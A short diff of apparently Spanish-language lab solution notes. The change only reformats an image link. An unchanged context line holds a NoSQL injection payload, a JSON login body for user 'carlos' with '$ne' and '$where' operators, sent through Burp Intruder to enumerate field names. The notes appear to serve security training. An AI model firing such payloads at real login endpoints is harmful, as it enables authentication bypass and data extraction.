@@ -6,7 +6,7 @@ Solucion
 
 esto lo mandamos al intruder {"username":"carlos","password":{"$ne":"test"},"$where":"Object.keys(this)[0].match('^.'{0}a.*')"}
 
-![[Pasted image 20250902015221.png]]
+![Pasted image 20250902015221.png](imagenes/Pasted image 20250902015221.png)
 
 
 
